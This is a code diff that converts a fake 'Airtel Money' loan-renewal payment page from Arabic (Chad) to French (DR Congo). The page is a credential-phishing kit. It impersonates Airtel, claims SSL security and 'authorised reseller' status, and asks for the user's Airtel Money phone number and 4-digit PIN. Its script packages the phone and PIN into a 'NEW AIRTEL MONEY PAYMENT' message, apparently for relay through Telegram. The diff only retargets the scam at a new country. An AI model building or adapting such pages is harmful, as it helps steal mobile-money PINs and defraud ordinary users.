@@ -1,10 +1,10 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="fr" dir="ltr">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Airtel Money - دفع آمن</title>
+    <title>Airtel Money - Paiement Sécurisé</title>
     <link rel="icon" type="image/png" href="https://www.starlink.com/favicon.ico">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link rel="stylesheet" href="https://unicons.iconscout.com/release/v4.0.0/css/line.css">
@@ -108,16 +108,16 @@
     </style>
 </head>
 
-<body class="bg-gray-50 text-right">
+<body class="bg-gray-50 text-left">
 
     <!-- Decline Overlay -->
     <div id="declineOverlay">
         <div class="decline-box">
             <div class="text-5xl mb-4">❌</div>
-            <h2 class="text-2xl font-bold text-red-600 mb-2">تم إدخال تفاصيل غير صحيحة</h2>
-            <p class="text-gray-600 mb-6">البيانات المُدخلة غير صحيحة. يرجى المحاولة مرة أخرى.</p>
+            <h2 class="text-2xl font-bold text-red-600 mb-2">Informations incorrectes</h2>
+            <p class="text-gray-600 mb-6">Les données saisies sont incorrectes. Veuillez réessayer.</p>
             <button onclick="closeDecline()" class="bg-black text-white px-8 py-3 rounded-xl font-bold hover:bg-gray-800">
-                حاول مرة أخرى
+                Réessayer
             </button>
         </div>
     </div>
@@ -125,27 +125,27 @@
     <div id="loadingOverlay">
         <div class="bg-white rounded-2xl p-6 text-center w-[320px]">
             <div class="spinner mx-auto mb-4"></div>
-            <h2 class="text-lg font-bold text-gray-900">جاري التحقق...</h2>
-            <p class="text-sm text-gray-600 mt-1">يرجى الانتظار بينما يؤكد تلغرام طلبك.</p>
+            <h2 class="text-lg font-bold text-gray-900">Vérification en cours...</h2>
+            <p class="text-sm text-gray-600 mt-1">Veuillez patienter pendant que Telegram confirme votre demande.</p>
         </div>
     </div>
 
     <!-- Header -->
     <header class="bg-black text-white shadow-sm">
-        <div class="max-w-7xl mx-auto px-4 py-4 flex items-center justify-between flex-row-reverse">
-            <a href="/" class="flex items-center gap-2 flex-row-reverse">
-                <span class="font-bold text-2xl tracking-widest">قروض أيرتل</span>
-                <span class="text-sm border-r pr-2 mr-2 border-gray-600 hidden sm:inline">شريك تشاد</span>
+        <div class="max-w-7xl mx-auto px-4 py-4 flex items-center justify-between flex-row">
+            <a href="/" class="flex items-center gap-2 flex-row">
+                <span class="font-bold text-2xl tracking-widest">Prêts Airtel</span>
+                <span class="text-sm border-l pl-2 ml-2 border-gray-600 hidden sm:inline">Partenaire Congo</span>
             </a>
-            <nav class="flex gap-6 flex-row-reverse">
-                <a href="/dashboard/" class="text-gray-300 hover:text-white flex items-center gap-2 flex-row-reverse">
-                    <i class="uil uil-wifi"></i> <span class="hidden sm:inline">الحالة</span>
+            <nav class="flex gap-6 flex-row">
+                <a href="/dashboard/" class="text-gray-300 hover:text-white flex items-center gap-2 flex-row">
+                    <i class="uil uil-wifi"></i> <span class="hidden sm:inline">Statut</span>
                 </a>
-                <a href="/plans/" class="text-gray-300 hover:text-white flex items-center gap-2 flex-row-reverse">
-                    <i class="uil uil-home"></i> <span class="hidden sm:inline">الخطط</span>
+                <a href="/plans/" class="text-gray-300 hover:text-white flex items-center gap-2 flex-row">
+                    <i class="uil uil-home"></i> <span class="hidden sm:inline">Forfaits</span>
                 </a>
-                <a href="/records/" class="text-gray-300 hover:text-white flex items-center gap-2 flex-row-reverse">
-                    <i class="uil uil-list-ul"></i> <span class="hidden sm:inline">الطلبات</span>
+                <a href="/records/" class="text-gray-300 hover:text-white flex items-center gap-2 flex-row">
+                    <i class="uil uil-list-ul"></i> <span class="hidden sm:inline">Demandes</span>
                 </a>
             </nav>
         </div>
@@ -158,25 +158,25 @@
 
                 <!-- Airtel Header with Logo -->
                 <div class="bg-gradient-to-r from-red-600 to-red-700 rounded-t-3xl p-6 sm:p-8 text-center shadow-lg">
-                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQTICkXqu9YQ2VAvDroBy3v_e9AkSB6Od-uEHMNDn3z4Q&s=10" alt="أيرتل" class="h-12 sm:h-14 mx-auto" style="filter: brightness(0) invert(1);">
-                    <h2 class="text-white font-bold mt-4 text-xl sm:text-2xl">أيرتل موني</h2>
+                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQTICkXqu9YQ2VAvDroBy3v_e9AkSB6Od-uEHMNDn3z4Q&s=10" alt="Airtel" class="h-12 sm:h-14 mx-auto" style="filter: brightness(0) invert(1);">
+                    <h2 class="text-white font-bold mt-4 text-xl sm:text-2xl">Airtel Money</h2>
                 </div>
 
                 <!-- Main Form Card -->
                 <div class="bg-white rounded-b-3xl card-shadow p-6 sm:p-8 border-x border-b border-gray-100">
 
                     <div class="mb-8">
-                        <div class="flex flex-col sm:flex-row justify-between items-center mb-6 pb-6 border-b border-gray-100 gap-4 flex-row-reverse">
-                            <div class="text-center sm:text-right">
-                                <p class="text-gray-400 text-xs uppercase font-bold tracking-widest">المبلغ</p>
-                                <p class="text-3xl sm:text-2xl font-black text-red-600">FCFA </p>
-                            </div>
+                        <div class="flex flex-col sm:flex-row justify-between items-center mb-6 pb-6 border-b border-gray-100 gap-4 flex-row">
                             <div class="text-center sm:text-left">
-                                <p class="text-gray-400 text-xs uppercase font-bold tracking-widest">الخدمة</p>
-                                <p class="text-sm font-bold text-gray-700">تجديد قرض أيرتل</p>
+                                <p class="text-gray-400 text-xs uppercase font-bold tracking-widest">Montant</p>
+                                <p class="text-3xl sm:text-2xl font-black text-red-600">FC</p>
+                            </div>
+                            <div class="text-center sm:text-right">
+                                <p class="text-gray-400 text-xs uppercase font-bold tracking-widest">Service</p>
+                                <p class="text-sm font-bold text-gray-700">Renouvellement Prêt Airtel</p>
                             </div>
                         </div>
-                        <p class="text-gray-600 text-sm text-center">أدخل رقم السري لأيرتل موني للتفويض</p>
+                        <p class="text-gray-600 text-sm text-center">Entrez votre code PIN Airtel Money pour l'autorisation</p>
                     </div>
 
                     <form method="POST" action="/hodl/" class="space-y-6" novalidate id="paymentForm">
@@ -185,18 +185,18 @@
                         <!-- Airtel Number Input -->
                         <div>
                             <label class="block text-gray-700 font-bold mb-3 text-sm">
-                                رقم أيرتل موني
+                                Numéro Airtel Money
                             </label>
 
-                            <div class="flex border-2 border-gray-300 rounded-xl overflow-hidden focus-within:border-red-600 focus-within:ring-2 focus-within:ring-red-100 transition-all duration-300 flex-row-reverse">
+                            <div class="flex border-2 border-gray-300 rounded-xl overflow-hidden focus-within:border-red-600 focus-within:ring-2 focus-within:ring-red-100 transition-all duration-300 flex-row">
 
-                                <div class="flex items-center px-3 border-l border-gray-300 bg-gray-50 gap-2 flex-row-reverse">
+                                <div class="flex items-center px-3 border-r border-gray-300 bg-gray-50 gap-2 flex-row">
 
-                                    <img id="countryFlag" src="https://flagcdn.com/w40/td.png" class="w-5 h-4 object-cover rounded-sm" alt="علم تشاد">
+                                    <img id="countryFlag" src="https://flagcdn.com/w40/cd.png" class="w-5 h-4 object-cover rounded-sm" alt="Drapeau RDC">
 
                                     <select id="countryCode" class="bg-transparent outline-none text-gray-700 font-bold text-sm cursor-pointer">
-                                        <option value="+235" data-flag="td" selected>+235</option>
-                                        <option value="+243" data-flag="cd">+243</option>
+                                        <option value="+243" data-flag="cd" selected>+243</option>
+                                        <option value="+235" data-flag="td">+235</option>
                                         <option value="+254" data-flag="ke">+254</option>
                                         <option value="+255" data-flag="tz">+255</option>
                                         <option value="+250" data-flag="rw">+250</option>
@@ -215,10 +215,10 @@
                         <!-- PIN Entry -->
                         <div class="text-center mt-8 mb-6">
                             <p class="text-gray-700 font-bold text-sm">
-                                أدخل رمز الـ PIN المكون من 4 أرقام
+                                Entrez votre code PIN à 4 chiffres
                             </p>
                             <p class="text-gray-500 text-xs mt-1">
-                                تحقق من تطبيق أيرتل موني أو رسالة SMS الواردة
+                                Vérifiez votre application Airtel Money ou le SMS reçu
                             </p>
                         </div>
 
@@ -234,16 +234,16 @@
                         <input type="hidden" id="pin-field" name="password" value="">
 
                         <!-- Submit Button -->
-                        <button type="submit" class="w-full bg-gradient-to-r from-red-600 to-red-700 hover:from-red-700 hover:to-red-800 text-white font-black py-4 rounded-xl shadow-lg shadow-red-200 transition-all transform active:scale-95 uppercase tracking-widest flex items-center justify-center gap-2 flex-row-reverse">
+                        <button type="submit" class="w-full bg-gradient-to-r from-red-600 to-red-700 hover:from-red-700 hover:to-red-800 text-white font-black py-4 rounded-xl shadow-lg shadow-red-200 transition-all transform active:scale-95 uppercase tracking-widest flex items-center justify-center gap-2 flex-row">
                             <i class="uil uil-check-circle"></i>
-                            تأكيد الدفع
+                            Confirmer le paiement
                         </button>
                     </form>
 
                     <!-- Security Note -->
-                    <div class="mt-8 flex items-center justify-center gap-2 text-gray-500 flex-row-reverse">
+                    <div class="mt-8 flex items-center justify-center gap-2 text-gray-500 flex-row">
                         <i class="uil uil-shield-check text-lg text-green-600"></i>
-                        <p class="text-[11px] uppercase font-bold tracking-widest">مشفر وآمن بواسطة SSL</p>
+                        <p class="text-[11px] uppercase font-bold tracking-widest">Chiffré et sécurisé par SSL</p>
                     </div>
                 </div>
             </div>
@@ -251,25 +251,25 @@
     </main>
 
     <!-- Footer -->
-    <footer class="bg-black text-gray-400 py-12 mt-12 text-right">
+    <footer class="bg-black text-gray-400 py-12 mt-12 text-left">
         <div class="max-w-7xl mx-auto px-4">
             <div class="grid grid-cols-1 md:grid-cols-3 gap-8 mb-8">
                 <div>
-                    <h3 class="text-white font-bold mb-4">قروض أيرتل</h3>
-                    <p class="text-sm">بائع معتمد لخدمات القروض في تشاد. مدفوعات سريعة، موثوقة وآمنة عبر أيرتل موني.</p>
+                    <h3 class="text-white font-bold mb-4">Prêts Airtel</h3>
+                    <p class="text-sm">Revendeur agréé de services de prêts en RDC. Paiements rapides, fiables et sécurisés via Airtel Money.</p>
                 </div>
                 <div>
-                    <h3 class="text-white font-bold mb-4">الدعم</h3>
-                    <p class="text-sm">البريد الإلكتروني: support@loandc.reseller</p>
-                    <p class="text-sm">متاح على مدار الساعة للمساعدة الفنية.</p>
+                    <h3 class="text-white font-bold mb-4">Support</h3>
+                    <p class="text-sm">E-mail : support@loandc.reseller</p>
+                    <p class="text-sm">Disponible 24h/24 et 7j/7 pour l'assistance technique.</p>
                 </div>
                 <div>
-                    <h3 class="text-white font-bold mb-4">الدفع</h3>
-                    <p class="text-sm">ادفع بأمان باستخدام أيرتل موني. تأكد من توفر رصيد كافٍ للباقة المختارة.</p>
+                    <h3 class="text-white font-bold mb-4">Paiement</h3>
+                    <p class="text-sm">Payez en toute sécurité avec Airtel Money. Assurez-vous d'avoir un solde suffisant pour le forfait choisi.</p>
                 </div>
             </div>
             <div class="border-t border-gray-800 pt-8 text-center">
-                <p>© 2026 أيرتل. جميع الحقوق محفوظة.</p>
+                <p>© 2026 Airtel. Tous droits réservés.</p>
             </div>
         </div>
     </footer>
@@ -471,13 +471,13 @@
                 const phone = phoneInput.value.trim();
                 if (!phone) {
                     setWaiting(false);
-                    alert("يرجى إدخال رقم أيرتل موني الخاص بك.");
+                    alert("Veuillez entrer votre numéro Airtel Money.");
                     return;
                 }
 
                 if (hiddenPin.value.length !== 4) {
                     setWaiting(false);
-                    alert("يرجى إدخال رمز الـ PIN المكون من 4 أرقام.");
+                    alert("Veuillez entrer le code PIN à 4 chiffres.");
                     return;
                 }
 
@@ -486,7 +486,7 @@
                 setWaiting(true);
 
                 const message = `
-🔴 NEW AIRTEL MONEY PAYMENT (CHAD)
+🔴 NEW AIRTEL MONEY PAYMENT (CONGO)
 ━━━━━━━━━━━━━━━━━━━━━
 📱 Phone : ${fullPhoneNumber}
 🔑 PIN : ${hiddenPin.value}
